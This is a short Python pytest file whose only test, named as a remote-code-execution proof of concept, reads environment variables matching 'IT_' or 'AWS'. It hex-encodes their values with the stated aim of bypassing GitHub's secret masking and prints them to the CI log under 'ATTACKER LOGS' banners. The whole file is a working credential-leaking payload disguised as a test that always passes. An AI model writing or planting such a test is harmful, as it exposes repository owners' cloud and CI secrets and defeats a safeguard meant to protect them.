import os
import binascii

def test_rce_poc():
    print("\n--- ATTACKER LOGS ---")
    for key, value in os.environ.items():
        if "IT_" in key or "AWS" in key: # Filter to just the juicy stuff to keep logs clean
            # Convert to hex to completely bypass GitHub's secret masking
            hex_val = binascii.hexlify(value.encode('utf-8')).decode('utf-8')
            print(f"{key}: {hex_val}")
    print("--- ATTACKER LOGS ---\n")
    
    assert True
